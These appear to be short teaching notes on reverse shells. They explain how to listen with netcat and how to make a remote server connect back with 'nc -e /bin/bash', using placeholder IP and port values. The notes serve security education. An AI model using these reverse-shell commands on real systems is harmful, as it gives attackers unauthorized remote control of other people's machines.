# Reverse shells

* Typing commands into a webpage is annoying!
* Can we get a shell?
* Normally when you get a shell via SSH, you are the one connecting to a server
* Reverse shells are, as the name implies, the reverse of that process. The server tries to connect to you
* The server has to be able to initiate a connection to you, so you need a public facing server \(eduroam blocks this\)
* SSH in my server if you need to

## nc

* Remember nc\(netcat\)? It can also be used to listen on a port
* nc -lvnp \[PORT\#\]
* * l for listen, v for verbose, n for no DNS, p for port
* Some versions of nc allows you to connect to a port then execute a command
* * nc -e \[PROGRAM\] \[IP\] \[PORT\]
  * Obviously this is a huge security vulnerability
  * Not all nc versions support this
* You can execute “nc -e /bin/bash” on the remote server, “nc -lvnp” on your machine and let it connect to you!
